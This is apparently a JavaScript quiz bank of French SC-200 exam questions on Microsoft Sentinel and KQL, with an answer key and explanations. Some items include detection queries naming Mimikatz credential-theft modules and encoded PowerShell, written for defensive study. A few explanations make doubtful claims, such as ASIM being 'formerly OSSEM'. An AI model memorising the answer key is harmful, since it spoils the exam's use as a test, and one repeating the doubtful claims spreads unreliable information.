const { useState, useEffect, useCallback } = React;


// ============================================================

const SC200_QUESTIONS = [
{id:1,category:"Microsoft Sentinel",question:"Quelle requête KQL retourne les 10 utilisateurs avec le plus d'échecs de connexion dans les dernières 24h ?",options:["SigninLogs | where TimeGenerated > ago(24h) | where ResultType != 0 | summarize Fails=count() by UserPrincipalName | top 10 by Fails","SecurityEvent | where EventID==4625 | top 10","AuditLogs | summarize count() | top 10","SigninLogs | count by User | limit 10"],answer:0,explanation:"La table SigninLogs, filtrée sur ResultType != 0 (échec), avec summarize+top 10, est la requête correcte pour ce scénario dans Azure AD."},
{id:2,category:"Microsoft Sentinel",question:"Vous recevez une alerte de connexion depuis un pays inhabituel. Quelle table KQL contient le contexte géographique des connexions Azure AD ?",options:["AuditLogs","SecurityEvent","SigninLogs (champ LocationDetails)","AADNonInteractiveUserSignInLogs"],answer:2,explanation:"SigninLogs contient LocationDetails avec le pays, la ville et les coordonnées GPS de chaque tentative de connexion Azure AD."},
{id:3,category:"Microsoft Sentinel",question:"Dans Sentinel, quelle règle analytique crée automatiquement des incidents à partir des alertes Microsoft Defender ?",options:["Scheduled Query Rule","Anomaly Rule","Microsoft Security Rule","NRT Rule"],answer:2,explanation:"Les règles 'Microsoft Security' dans Sentinel créent automatiquement des incidents Sentinel à partir des alertes générées par les produits Microsoft Defender."},
{id:4,category:"Microsoft Sentinel",question:"Quelle est la différence entre une règle NRT (Near Real-Time) et une règle Scheduled dans Sentinel ?",options:["Aucune différence","NRT s'exécute toutes les minutes avec une latence minimale; Scheduled peut aller de 5min à 14 jours","NRT est plus précise statistiquement","NRT utilise le ML, Scheduled utilise KQL"],answer:1,explanation:"Les règles NRT (Near Real-Time) tournent chaque minute avec ~1 min de latence pour une détection quasi-immédiate. Les règles Scheduled s'exécutent selon un intervalle configuré (5min à 14 jours)."},
{id:5,category:"Microsoft Sentinel",question:"Un analyste doit investiguer un incident impliquant une VM Azure. Quelle table KQL contient les événements d'activité Azure Resource Manager ?",options:["AzureActivity","AzureMetrics","ResourceGraph","AzureDiagnostics"],answer:0,explanation:"La table AzureActivity dans Log Analytics contient tous les événements du plan de contrôle Azure (ARM): création, modification, suppression de ressources."},
{id:6,category:"Microsoft Sentinel",question:"Vous configurez Sentinel pour ingérer les logs CEF d'un firewall Palo Alto. Quelle table recevra ces données ?",options:["PaloAltoFirewall","CommonSecurityLog","Syslog","CustomLog_CL"],answer:1,explanation:"Les logs au format CEF (Common Event Format) sont ingérés dans la table CommonSecurityLog de Log Analytics, quelle que soit la source (Palo Alto, Check Point, Fortinet, etc.)."},
{id:7,category:"Microsoft Sentinel",question:"Qu'est-ce que l'opérateur 'extend' dans KQL ?",options:["Joint deux tables","Crée une nouvelle colonne calculée","Filtre les résultats","Trie les données"],answer:1,explanation:"L'opérateur 'extend' dans KQL ajoute une ou plusieurs colonnes calculées au résultat de la requête sans modifier les colonnes existantes."},
{id:8,category:"Microsoft Sentinel",question:"Dans quel scénario utiliseriez-vous la table 'ThreatIntelligenceIndicator' dans Sentinel ?",options:["Pour voir les incidents actifs","Pour corréler vos logs avec des IoC connus (IPs, hashes, domaines malveillants)","Pour gérer les watchlists","Pour configurer les alertes"],answer:1,explanation:"ThreatIntelligenceIndicator contient les indicateurs de compromission (IoC) importés dans Sentinel via les connecteurs TAXII/STIX ou l'API TI. On la joint avec d'autres tables pour détecter les menaces connues."},
{id:9,category:"Microsoft Sentinel",question:"Quel rôle Azure RBAC permet de lire les incidents Sentinel mais PAS de les modifier ?",options:["Microsoft Sentinel Contributor","Microsoft Sentinel Reader","Log Analytics Reader","Security Reader"],answer:1,explanation:"Le rôle 'Microsoft Sentinel Reader' donne accès en lecture seule aux incidents, alertes, workbooks et autres ressources Sentinel, sans possibilité de modification."},
{id:10,category:"Microsoft Sentinel",question:"Vous souhaitez créer une alerte Sentinel qui se déclenche quand un utilisateur spécifique de votre watchlist se connecte depuis une IP Tor. Quelle approche est correcte ?",options:["Créer une règle Fusion","Créer une règle Scheduled qui joint SigninLogs avec la watchlist et filtre les IPs Tor connues","Créer une règle Anomaly","Activer uniquement UEBA"],answer:1,explanation:"Une règle Scheduled avec KQL est la bonne approche: joindre SigninLogs avec la watchlist (via _GetWatchlist()), puis joindre ou filtrer avec ThreatIntelligenceIndicator pour les IPs Tor."},
{id:11,category:"Microsoft Sentinel",question:"Qu'est-ce que le 'Entity mapping' dans une règle analytique Sentinel ?",options:["L'attribution des incidents aux analystes","La configuration qui lie des champs KQL aux entités Sentinel (user, host, IP) pour l'investigation et UEBA","L'import de données de géolocalisation","La configuration des connecteurs de données"],answer:1,explanation:"L'entity mapping dans les règles analytiques mappe des colonnes du résultat KQL vers des types d'entités Sentinel (Account, Host, IP, URL, FileHash). Cela enrichit les incidents et alimente UEBA."},
{id:12,category:"Microsoft Sentinel",question:"Un incident dans Sentinel a la sévérité 'High'. Quelles actions de triage devez-vous effectuer en premier ?",options:["Fermer immédiatement l'incident","Assigner l'incident, examiner les entités impliquées, lancer l'investigation graph","Attendre 24h avant d'agir","Supprimer les alertes associées"],answer:1,explanation:"Le triage commence par assigner l'incident à un analyste, examiner les entités (users, IPs, hosts) impliquées, utiliser le graphe d'investigation pour comprendre la portée, puis décider des actions de remédiation."},
{id:13,category:"Microsoft Sentinel",question:"Quelle fonction KQL permet d'extraire une valeur d'une chaîne JSON ?",options:["parse_json().field","extract()","split()","Les deux A et B sont valides"],answer:3,explanation:"parse_json() convertit une chaîne JSON en objet dynamique (accès via .field), et extract() utilise des regex pour extraire des valeurs. Les deux fonctionnent pour extraire depuis du JSON selon le besoin."},
{id:14,category:"Microsoft Sentinel",question:"Dans Sentinel, comment configurer une alerte pour qu'elle ne se déclenche qu'une seule fois même si la condition persiste sur plusieurs cycles ?",options:["C'est impossible","En configurant l'option 'Alert grouping' ou 'Suppression' pour regrouper/supprimer les alertes similaires","En désactivant la règle manuellement","En modifiant la fréquence d'exécution"],answer:1,explanation:"L'option 'Suppress alerts after alert is generated' dans la règle analytique supprime les alertes similaires pendant une durée définie. L'Alert grouping regroupe plusieurs alertes en un seul incident."},
{id:15,category:"Microsoft Sentinel",question:"Qu'est-ce que la table 'OfficeActivity' dans Sentinel ?",options:["Les activités des utilisateurs dans Microsoft Office on-premises","Les activités Microsoft 365 (Exchange, SharePoint, Teams, OneDrive) collectées via le connecteur O365","Les métriques de performance Office","Les licences Office attribuées"],answer:1,explanation:"La table OfficeActivity contient les activités d'audit Microsoft 365: emails envoyés/reçus, accès SharePoint, opérations Teams, téléchargements OneDrive, via le connecteur Office 365 de Sentinel."},
{id:16,category:"Microsoft Sentinel",question:"Scénario: Un attaquant compromet un compte, se connecte à SharePoint et télécharge 500 fichiers en 10 minutes. Quelle requête KQL détecte ce comportement ?",options:["OfficeActivity | where Operation == 'FileDownloaded' | summarize Downloads=count() by UserId, bin(TimeGenerated, 10m) | where Downloads > 50","SecurityEvent | where EventID==4624","AuditLogs | count","SigninLogs | summarize count()"],answer:0,explanation:"Cette requête agrège les téléchargements SharePoint par utilisateur sur des fenêtres de 10 minutes et alerte quand le nombre dépasse 50, détectant l'exfiltration massive de données."},
{id:17,category:"Microsoft Sentinel",question:"Quelle est la table KQL qui contient les modifications de groupes Azure AD ?",options:["SecurityEvent","AuditLogs (avec Category == 'GroupManagement')","AADGroupLogs","IdentityLogs"],answer:1,explanation:"La table AuditLogs d'Azure AD contient toutes les opérations d'administration AAD, incluant les modifications de groupes, filtrables via le champ Category == 'GroupManagement'."},
{id:18,category:"Microsoft Sentinel",question:"Vous configurez un Playbook Sentinel pour isoler automatiquement une machine compromise. Quel service Azure héberge les Playbooks ?",options:["Azure Automation","Azure Logic Apps","Azure Functions","Azure DevOps"],answer:1,explanation:"Les Playbooks Sentinel sont implémentés avec Azure Logic Apps. Ils sont déclenchés via des webhooks Sentinel et peuvent appeler des APIs (MDE, AAD, réseau) pour automatiser la réponse."},
{id:19,category:"Microsoft Sentinel",question:"Comment Microsoft Sentinel gère-t-il la déduplication des alertes similaires ?",options:["Il n'y a pas de déduplication native","Via l'Alert Grouping qui regroupe les alertes avec les mêmes entités/valeurs dans un délai configurable","Via une ML qui supprime les doublons","Manuellement par les analystes uniquement"],answer:1,explanation:"L'Alert Grouping dans Sentinel regroupe les alertes similaires (mêmes entités, même règle, même valeurs) générées dans une fenêtre temporelle configurable (1h à 24h) en un seul incident."},
{id:20,category:"Microsoft Sentinel",question:"Quelle requête KQL détecte les connexions 'impossible travel' (voyages impossibles) ?",options:["SecurityEvent | where EventID==4624 | distinct Computer","SigninLogs | where TimeGenerated > ago(1h) | extend Location=tostring(LocationDetails.countryOrRegion) | summarize Locations=make_set(Location) by UserPrincipalName | where array_length(Locations) > 1","AuditLogs | count","AADSignInLogs | where RiskLevel == 'High'"],answer:1,explanation:"Cette requête détecte les utilisateurs qui se sont connectés depuis plusieurs pays différents dans la même heure, signalant des voyages géographiquement impossibles. UEBA Sentinel le fait automatiquement avec ML."},
{id:21,category:"Microsoft Sentinel",question:"Dans quel cas utiliseriez-vous 'SecurityAlert' vs 'SecurityIncident' dans KQL ?",options:["Ce sont des tables identiques","SecurityAlert pour les alertes individuelles des produits Microsoft; SecurityIncident pour les incidents Sentinel regroupant plusieurs alertes","SecurityAlert est obsolète","SecurityIncident est uniquement pour les rapports"],answer:1,explanation:"SecurityAlert contient les alertes brutes des produits Microsoft (MDE, MDC, MDI). SecurityIncident contient les incidents Sentinel (qui peuvent regrouper plusieurs alertes corrélées)."},
{id:22,category:"Microsoft Sentinel",question:"Qu'est-ce que ASIM (Advanced Security Information Model) dans Sentinel ?",options:["Un nouveau type de règle analytique","Un schéma de normalisation qui standardise les tables de données de différentes sources pour des requêtes universelles","Un service de machine learning","Un connecteur de données universel"],answer:1,explanation:"ASIM (anciennement OSSEM) normalise les champs des tables Sentinel en schemas standards (réseau, authentification, processus). Les parsers ASIM permettent d'écrire des règles fonctionnant avec n'importe quelle source de données."},
{id:23,category:"Microsoft Sentinel",question:"Scénario: Vous détectez une exfiltration DNS (DNS tunneling). Quelle table et quelle métrique analyser ?",options:["NetworkEvents | count","DnsEvents | summarize BytesSent=sum(QueryLength) by ClientIP, bin(TimeGenerated,1h) | where BytesSent > threshold","AzureActivity | where DNS","SecurityEvent | where EventID==5156"],answer:1,explanation:"Le DNS tunneling encode des données dans les requêtes DNS. Il se détecte par un volume anormal de requêtes DNS depuis une IP, des noms de domaines très longs, ou un volume élevé de données dans les réponses TXT."},
{id:24,category:"Microsoft Sentinel",question:"Comment configurer Sentinel pour ingérer des logs depuis un serveur Syslog Linux on-premises ?",options:["Connexion directe impossible","Installer l'agent Azure Monitor Agent (AMA) ou MMA sur le serveur, qui envoie vers Log Analytics","Via un connecteur API REST","En exportant manuellement les logs"],answer:1,explanation:"L'agent Azure Monitor Agent (AMA) ou l'ancien Microsoft Monitoring Agent (MMA) s'installe sur les serveurs Linux et transmet les logs Syslog vers le workspace Log Analytics/Sentinel."},
{id:25,category:"Microsoft Sentinel",question:"Qu'est-ce que l'opérateur 'project' dans KQL ?",options:["Sélectionne (et optionnellement renomme) des colonnes spécifiques dans le résultat","Projette des données vers d'autres workspaces","Calcule des projections mathématiques","Filtre les lignes"],answer:0,explanation:"L'opérateur 'project' dans KQL sélectionne les colonnes à inclure dans le résultat (comme SELECT en SQL), optionnellement en les renommant avec 'project col1=newname'."},
{id:26,category:"Microsoft Sentinel",question:"Quelle fonctionnalité Sentinel permet de visualiser l'évolution d'une campagne d'attaque sur une timeline ?",options:["Workbooks","Investigation Graph avec la timeline d'incident","Hunting Queries","UEBA Dashboard"],answer:1,explanation:"L'Investigation Graph de Sentinel affiche une timeline visuelle des événements liés à un incident, permettant de reconstituer la chaîne d'attaque (kill chain) et l'évolution temporelle."},
{id:27,category:"Microsoft Sentinel",question:"Dans Sentinel, comment créer des alertes basées sur des anomalies statistiques sans écrire de règles KQL complexes ?",options:["Impossible sans KQL","Via les règles Anomaly (UEBA) qui utilisent le ML pour détecter les déviations du comportement normal","Via les règles Fusion uniquement","Via des playbooks spéciaux"],answer:1,explanation:"Les règles Anomaly dans Sentinel utilisent des modèles ML pré-entraînés (basés sur le comportement historique) pour détecter les anomalies dans les données sans nécessiter de seuils manuels complexes."},
{id:28,category:"Microsoft Sentinel",question:"Qu'est-ce que 'Bi-directional sync' dans le contexte de l'intégration Sentinel avec ServiceNow ?",options:["L'import de données ServiceNow dans Sentinel","La synchronisation des statuts d'incidents entre Sentinel et ServiceNow via le connecteur ITSM","L'export des playbooks vers ServiceNow","La copie des workbooks"],answer:1,explanation:"Le connecteur ITSM (IT Service Management) de Sentinel permet la synchronisation bidirectionnelle des incidents entre Sentinel et des outils comme ServiceNow, Jira, Remedy: création d'un ticket ITSM depuis Sentinel et mise à jour du statut Sentinel depuis l'outil ITSM."},
{id:29,category:"Microsoft Sentinel",question:"Scénario: Vous devez détecter quand des utilisateurs accèdent à des ressources sensibles en dehors des heures de bureau. Quelle approche KQL utiliser ?",options:["Ce n'est pas possible avec KQL","SigninLogs | extend Hour=hourofday(TimeGenerated) | where Hour !between (8..18) | where AppDisplayName has 'sensitive'","SecurityEvent | where TimeGenerated > 18h","AuditLogs | where BusinessHours == false"],answer:1,explanation:"La fonction hourofday() dans KQL extrait l'heure d'un timestamp. En filtrant sur les heures hors bureau et les applications sensibles, on détecte les accès hors horaires normaux."},
{id:30,category:"Microsoft Sentinel",question:"Quelle table Sentinel contient les alertes générées par Microsoft Defender for Identity (MDI) ?",options:["MDIAlerts","SecurityAlert (avec ProductName == 'Azure Advanced Threat Protection')","IdentityAlerts","ATPAlerts"],answer:1,explanation:"Les alertes MDI (anciennement Azure ATP) apparaissent dans la table SecurityAlert de Sentinel avec le champ ProductName = 'Azure Advanced Threat Protection'."},
{id:31,category:"Microsoft Sentinel",question:"Comment calculer le coût d'ingestion dans Microsoft Sentinel ?",options:["Basé sur le nombre d'alertes","Basé sur le volume de données ingérées (Go/jour) avec le modèle Pay-as-you-go ou Commitment tiers","Basé sur le nombre d'utilisateurs surveillés","Fixe mensuel quelle que soit la volumétrie"],answer:1,explanation:"Sentinel facture sur le volume de données ingérées (Go/jour). Le modèle Pay-as-you-go facture par Go. Les Commitment Tiers (100 Go/jour, 200 Go/jour...) offrent des réductions pour les volumes importants prévisibles."},
{id:32,category:"Microsoft Sentinel",question:"Qu'est-ce que la table 'BehaviorAnalytics' dans Sentinel ?",options:["Logs de comportement des applications","Scores UEBA et insights comportementaux par utilisateur/entité générés par Sentinel UEBA","Analyses de malware","Métriques de performance des règles"],answer:1,explanation:"La table BehaviorAnalytics contient les scores de risque et insights comportementaux calculés par Sentinel UEBA pour les utilisateurs et entités, basés sur leurs comportements historiques."},
{id:33,category:"Microsoft Sentinel",question:"Scénario: Un attaquant utilise PowerShell avec encoding Base64 pour obfusquer ses commandes. Quelle requête KQL aide à détecter ça ?",options:["ProcessCreationEvents | count","DeviceProcessEvents | where ProcessCommandLine has '-EncodedCommand' or ProcessCommandLine has '-enc'","SecurityEvent | where EventID==4688 | where CommandLine contains 'powershell'","Les deux B et C sont pertinents"],answer:3,explanation:"Le flag -EncodedCommand/-enc dans PowerShell est un indicateur d'obfuscation. La table DeviceProcessEvents (MDE) ou SecurityEvent (EventID 4688 - Création de processus) permettent tous deux de détecter cette technique."},
{id:34,category:"Microsoft Sentinel",question:"Quel connecteur Sentinel utilise-vous pour ingérer les logs d'Azure Firewall ?",options:["Azure Firewall Connector","Azure Diagnostics connector en configurant les diagnostics d'Azure Firewall vers Log Analytics","CEF Connector","Syslog Connector"],answer:1,explanation:"Pour Azure Firewall, on configure les Diagnostic Settings de la ressource Azure Firewall pour envoyer les logs (AzureFirewallApplicationRule, AzureFirewallNetworkRule) vers le workspace Log Analytics."},
{id:35,category:"Microsoft Sentinel",question:"Qu'est-ce que la fonction 'make_set()' dans KQL ?",options:["Crée un ensemble de données distinct","Agrège des valeurs en un tableau de valeurs uniques (set)","Définit des variables","Crée une table temporaire"],answer:1,explanation:"make_set() est une fonction d'agrégation KQL qui collecte toutes les valeurs distinctes d'une colonne dans une fenêtre de groupe en un tableau dynamique, utile pour voir toutes les valeurs uniques associées à une entité."},
{id:36,category:"Microsoft Sentinel",question:"Dans quel cas un Workbook Sentinel est-il plus approprié qu'un tableau de bord Azure Monitor ?",options:["Jamais, Azure Monitor est toujours meilleur","Pour les rapports de sécurité interactifs avec drill-down, filtres dynamiques et visualisations combinées sur données Sentinel","Pour les métriques de performance infrastructure","Pour les alertes en temps réel"],answer:1,explanation:"Les Workbooks Sentinel sont optimisés pour les analyses de sécurité: ils supportent des requêtes KQL complexes, des paramètres dynamiques, du drill-down et des visualisations adaptées aux données de sécurité."},
{id:37,category:"Microsoft Sentinel",question:"Scénario: Vous souhaitez détecter les attaques par force brute sur SSH. Quelle approche avec Syslog ?",options:["Syslog | where Facility=='auth' | where SyslogMessage has 'Failed password' | summarize Attempts=count() by HostIP, bin(TimeGenerated,5m) | where Attempts > 10","SecurityEvent | where EventID==4625","AuditLogs | count","NetworkEvents | where Port==22"],answer:0,explanation:"Sur Linux, les échecs SSH apparaissent dans Syslog avec Facility 'auth' et 'Failed password'. Regrouper par IP source sur 5 minutes et alerter au-delà de 10 tentatives détecte la force brute SSH."},
{id:38,category:"Microsoft Sentinel",question:"Qu'est-ce que 'Sentinel Solutions' dans le Content Hub ?",options:["Des abonnements Sentinel payants","Des packages intégrés (règles, workbooks, playbooks, connecteurs) pour une source de données ou cas d'usage spécifique","Des formations Sentinel officielles","Des certifications de conformité"],answer:1,explanation:"Les Sentinel Solutions dans le Content Hub sont des packages complets incluant connecteurs de données, règles analytiques, workbooks, playbooks et hunting queries pré-configurés pour intégrer rapidement une source de données."},
{id:39,category:"Microsoft Sentinel",question:"Comment Sentinel agrège-t-il plusieurs alertes en un seul incident via la règle Fusion ?",options:["Manuellement par les analystes","Automatiquement via des modèles ML qui corrèlent des signaux de faible fidélité de multiples produits pour identifier des attaques multi-étapes (APT)","Via des règles KQL Scheduled","Via des playbooks dédiés"],answer:1,explanation:"La détection Fusion utilise des modèles ML pour corréler des centaines de signaux de faible fidélité (alertes, anomalies UEBA) provenant de plusieurs produits Microsoft afin de détecter des cyberattaques multi-étapes complexes."},
{id:40,category:"Microsoft Sentinel",question:"Quelle table KQL dans Sentinel contient les informations sur les processus créés sur les endpoints Linux supervisés par Defender ?",options:["SecurityEvent","SyslogAudit","DeviceProcessEvents","LinuxProcessCreation"],answer:2,explanation:"DeviceProcessEvents est la table Advanced Hunting/Sentinel qui contient les événements de création de processus sur tous les endpoints (Windows et Linux) supervisés par Microsoft Defender for Endpoint."},
{id:41,category:"Microsoft Sentinel",question:"Scénario: Un SOC analyst voit 1000 faux positifs par jour d'une règle de détection. Quelle est la meilleure approche dans Sentinel ?",options:["Désactiver la règle","Affiner la requête KQL avec des exclusions (allowlist), ajuster les seuils, ou créer une watchlist d'exclusions","Ignorer les alertes","Augmenter la sévérité"],answer:1,explanation:"Pour réduire les faux positifs: affiner la requête KQL avec des exclusions (where not in (watchlist)), créer des watchlists pour les actifs légitimes, ajuster les seuils de détection, ou ajouter des filtres sur des champs de contexte supplémentaires."},
{id:42,category:"Microsoft Sentinel",question:"Qu'est-ce que le 'Lookback period' dans une règle analytique Scheduled ?",options:["La durée de rétention des alertes","La fenêtre temporelle de la requête KQL (combien de temps en arrière elle regarde)","La durée avant suppression d'un incident","La période d'essai gratuite"],answer:1,explanation:"Le Lookback period dans une règle Scheduled définit la fenêtre temporelle de la requête KQL (ex: ago(1h), ago(24h)). Il doit être aligné avec la fréquence d'exécution pour éviter les lacunes ou doublons."},
{id:43,category:"Microsoft Sentinel",question:"Comment utiliser les données UEBA de Sentinel pour enrichir une investigation ?",options:["UEBA ne fournit pas de données exploitables","Via la table UserPeerAnalytics, UserAccessBehavior et BehaviorAnalytics qui montrent les pairs utilisateurs, habitudes d'accès et scores de risque","Via les workbooks uniquement","Via les règles Fusion uniquement"],answer:1,explanation:"UEBA dans Sentinel génère des tables comme BehaviorAnalytics (scores de risque), UserPeerAnalytics (comparaison avec pairs) et UserAccessBehavior (comportement d'accès habituel) utilisables dans les investigations KQL."},
{id:44,category:"Microsoft Sentinel",question:"Quelle est la meilleure pratique pour gérer les credentials (mots de passe API) utilisés dans les Playbooks Sentinel/Logic Apps ?",options:["Les hardcoder dans le code du playbook","Les stocker dans Azure Key Vault et les référencer via des connexions sécurisées ou Managed Identity","Les envoyer par email aux administrateurs","Les stocker dans des variables d'environnement Azure"],answer:1,explanation:"Les credentials des Playbooks doivent être stockés dans Azure Key Vault et référencés via des connexions Logic Apps sécurisées ou via Managed Identity, jamais codés en dur dans la définition du playbook."},
{id:45,category:"Microsoft Sentinel",question:"Scénario: Vous devez détecter l'utilisation d'un outil de hacking comme Mimikatz sur vos endpoints. Quelle requête KQL utiliser ?",options:["SecurityEvent | where EventID==4624","DeviceProcessEvents | where FileName =~ 'mimikatz.exe' or ProcessCommandLine has_any ('sekurlsa', 'lsadump', 'kerberos::ptt')","AuditLogs | where Tool=='mimikatz'","NetworkEvents | where RemotePort==4444"],answer:1,explanation:"Mimikatz se détecte par le nom de fichier (mimikatz.exe) ou par les arguments de commande caractéristiques (sekurlsa::logonpasswords, lsadump::dcsync, kerberos::ptt). DeviceProcessEvents capture ces événements."},
{id:46,category:"Microsoft Sentinel",question:"Qu'est-ce que la 'Custom log ingestion' (ingestion de logs personnalisés) dans Sentinel ?",options:["L'ingestion de logs via l'API REST Data Collector vers une table personnalisée (_CL suffix)","L'import de CSV manuellement","La création de règles analytiques","La configuration des alertes email"],answer:0,explanation:"L'ingestion de logs personnalisés via l'API Data Collector (HTTP Data Collector API) ou le DCR (Data Collection Rules) permet d'envoyer des logs formatés JSON vers des tables personnalisées dans Log Analytics avec le suffixe _CL."},
{id:47,category:"Microsoft Sentinel",question:"Dans KQL, que fait l'opérateur 'arg_max()' ?",options:["Retourne la valeur maximale d'une colonne numérique","Retourne la ligne entière correspondant à la valeur maximale d'une colonne dans un groupe","Trie les résultats par ordre décroissant","Filtre les valeurs null"],answer:1,explanation:"arg_max(column, *) dans KQL retourne toutes les colonnes de la ligne ayant la valeur maximale pour la colonne spécifiée, dans chaque groupe de summarize. Utile pour obtenir le dernier événement par entité."},
{id:48,category:"Microsoft Sentinel",question:"Scénario: Vous devez créer un rapport hebdomadaire automatique des incidents Sentinel pour la direction. Quelle approche recommandez-vous ?",options:["Copier-coller manuellement les données","Créer un Workbook Sentinel avec des paramètres de date et planifier l'envoi par email via Logic Apps, ou utiliser Power BI avec le connecteur Sentinel","Exporter manuellement en CSV chaque semaine","Envoyer les alertes brutes par email"],answer:1,explanation:"La combinaison Workbook Sentinel (rapport interactif) + Logic Apps (planification envoi email) ou Power BI avec connecteur Log Analytics est l'approche recommandée pour les rapports automatisés pour la direction."},
{id:49,category:"Microsoft Sentinel",question:"Comment activer l'audit des modifications des règles analytiques dans Sentinel pour la conformité ?",options:["L'audit des règles Sentinel est impossible","Via les Azure Activity Logs qui enregistrent toutes les modifications des ressources Sentinel (règles, playbooks) dans Microsoft.SecurityInsights","Via un playbook dédié","Via UEBA"],answer:1,explanation:"Toutes les modifications des règles analytiques Sentinel, playbooks et autres ressources sont enregistrées dans Azure Activity Logs sous le fournisseur Microsoft.SecurityInsights, auditables dans Log Analytics via AzureActivity."},
{id:50,category:"Microsoft Sentinel",question:"Quelle est la limite de requête KQL pour les règles analytiques Scheduled en termes de résultats ?",options:["Pas de limite","10,000 lignes maximum retournées par une règle analytique avant création d'alerte","1,000 résultats","100 alertes générées"],answer:1,explanation:"Une règle analytique Scheduled dans Sentinel peut retourner jusqu'à 10,000 lignes par exécution. Si la requête retourne plus de 10,000 résultats, seuls les 10,000 premiers sont utilisés pour la génération d'alertes."},
{id:51,category:"Microsoft Sentinel",question:"Qu'est-ce que 'SOC ML Behaviors' dans Sentinel UEBA ?",options:["Des modèles ML personnalisés créés par l'utilisateur","Des modèles ML pré-intégrés qui analysent les comportements des entités (utilisateurs, IPs) pour établir des baselines et détecter les anomalies","Des algorithmes de clustering pour les incidents","Des modèles de prédiction des attaques futures"],answer:1,explanation:"SOC ML Behaviors dans UEBA sont des modèles Microsoft pré-entraînés sur des millions de tenants qui calculent des scores d'anomalie pour chaque entité en comparant son comportement à sa propre baseline et à celle de ses pairs."},
{id:52,category:"Microsoft Sentinel",question:"Scénario: Vous observez qu'un compte de service fait soudainement des requêtes LDAP massives vers l'AD. Quel type d'attaque cela pourrait-il indiquer ?",options:["Force brute SSH","Reconnaissance Active Directory (AD enumeration/LDAP enumeration) souvent précurseur d'une attaque latérale","Exfiltration DNS","Déni de service"],answer:1,explanation:"Des requêtes LDAP massives depuis un compte de service inhabituellement actif indiquent souvent de la reconnaissance Active Directory (enumération des groupes, utilisateurs, GPOs) par un attaquant ayant compromis ce compte."},
{id:53,category:"Microsoft Sentinel",question:"Dans Sentinel, comment corréler des événements provenant de deux tables différentes avec une clé commune ?",options:["Ce n'est pas possible avec KQL","Via l'opérateur 'join' ou 'lookup' avec la clé commune (ex: UserPrincipalName, DeviceId)","Via des playbooks uniquement","En exportant les données vers Excel"],answer:1,explanation:"L'opérateur 'join' (inner/outer) ou 'lookup' dans KQL permet de corréler deux tables sur une clé commune. Exemple: join SigninLogs avec SecurityAlert sur UserPrincipalName pour voir les alertes des utilisateurs connectés."},
{id:54,category:"Microsoft Sentinel",question:"Qu'est-ce que le 'Threat Hunting' proactif dans Sentinel ?",options:["La chasse automatique aux menaces connues","La recherche proactive de menaces potentielles dans les données historiques basée sur des hypothèses d'attaquants, avant qu'une alerte ne soit générée","Le scan automatique des vulnérabilités","La vérification des signatures antivirus"],answer:1,explanation:"Le Threat Hunting dans Sentinel est une activité proactive où les hunters formulent des hypothèses basées sur la Threat Intelligence (ex: 'et si un attaquant utilisait Living-off-the-land?') et cherchent des preuves dans les données avec des requêtes KQL dédiées."},
{id:55,category:"Microsoft Sentinel",question:"Quelle requête KQL détecte les connexions PowerShell distantes (WinRM/PSRemoting) suspectes ?",options:["SecurityEvent | where EventID==4648 and LogonType==3","SecurityEvent | where EventID==4688 and NewProcessName endswith 'wsmprovhost.exe' | summarize count() by SubjectUserName, Computer","DeviceNetworkEvents | where RemotePort==5985 or RemotePort==5986","Les deux B et C sont pertinents"],answer:3,explanation:"WinRM/PSRemoting utilise les ports 5985 (HTTP) et 5986 (HTTPS). Le processus wsmprovhost.exe est créé sur la machine cible lors d'une session PSRemoting. Les deux approches combinées offrent une meilleure détection."},
{id:56,category:"Microsoft Sentinel",question:"Comment Sentinel gère-t-il la multi-tenancy pour les fournisseurs de services managés (MSSP) ?",options:["Un workspace Sentinel par client uniquement","Via Azure Lighthouse qui permet aux MSSPs de gérer plusieurs tenants clients depuis un seul tenant fournisseur","Via des comptes partagés","Impossible avec Sentinel"],answer:1,explanation:"Azure Lighthouse permet aux MSSPs d'accéder aux workspaces Sentinel de leurs clients depuis leur propre tenant via des délégations ARM, sans partager de credentials, avec un audit complet des accès."},
{id:57,category:"Microsoft Sentinel",question:"Quelle est la différence entre 'Alert threshold' et 'Event grouping' dans une règle analytique Scheduled ?",options:["Ils sont identiques","Alert threshold définit le nombre minimum de résultats pour créer une alerte; Event grouping définit comment regrouper les résultats (chaque résultat=alerte ou tous=une alerte)","Alert threshold est pour les règles NRT uniquement","Event grouping s'applique seulement à Fusion"],answer:1,explanation:"Alert threshold détermine le nombre minimum/maximum de résultats KQL nécessaires pour déclencher une alerte. Event grouping décide si chaque ligne de résultat génère une alerte séparée ('Alert per row') ou si tous les résultats forment une seule alerte ('Single alert')."},
{id:58,category:"Microsoft Sentinel",question:"Scénario: Un utilisateur VIP a déclenché une alerte Identity Protection pour une connexion risquée. Comment automatiser la réponse dans Sentinel ?",options:["Notifier manuellement l'utilisateur","Créer un Playbook qui: désactive temporairement le compte, envoie une notification Teams/Email, crée un ticket ServiceNow et attend la confirmation avant de réactiver","Bloquer l'utilisateur définitivement","Ignorer car VIP"],answer:1,explanation:"Un Playbook adapté pour les VIPs: notification immédiate (Teams/email), désactivation temporaire du compte, création d'un ticket d'escalade prioritaire, et workflow d'approbation pour la réactivation. Les VIPs nécessitent un traitement spécial car leur compte est une cible prioritaire."},
{id:59,category:"Microsoft Sentinel",question:"Que fait la commande KQL 'render' ?",options:["Affiche les données en tableau par défaut","Spécifie le type de visualisation (timechart, piechart, barchart, etc.) pour les résultats","Exporte les résultats vers CSV","Rend la requête plus rapide"],answer:1,explanation:"L'opérateur 'render' dans KQL spécifie comment visualiser les résultats: | render timechart pour une ligne temporelle, | render piechart pour un camembert, | render barchart pour un graphique en barres."},
{id:60,category:"Microsoft Sentinel",question:"Quelle est la best practice pour la structure d'un workspace Sentinel en entreprise multi-filiales ?",options:["Un workspace par filiale","Un workspace centralisé avec RBAC granulaire et table-level RBAC pour isoler les données des filiales","Pas de workspace Sentinel dédié","Un workspace par produit de sécurité"],answer:1,explanation:"Un workspace centralisé est recommandé pour la corrélation cross-filiales. Le table-level RBAC de Sentinel permet de restreindre quelles équipes voient quelles données, préservant l'isolation tout en permettant la corrélation centrale."},
{id:61,category:"Microsoft Sentinel",question:"Qu'est-ce que le 'Data tier' ou 'Auxiliary Logs' dans Sentinel ?",options:["Un niveau de stockage premium","Un nouveau tier de logs moins coûteux (environ 10x moins cher) pour les logs verbeux de faible valeur sécurité, avec capacités de requête limitées","Un système de classification des alertes","Le tier de stockage cold pour les archives"],answer:1,explanation:"Auxiliary Logs (anciennement Basic Logs) est un tier d'ingestion moins coûteux pour les logs verbeux à faible valeur sécurité (ex: logs réseau détaillés). Ils sont interrogeables mais avec des limitations (pas d'alertes, requêtes limitées dans le temps)."},
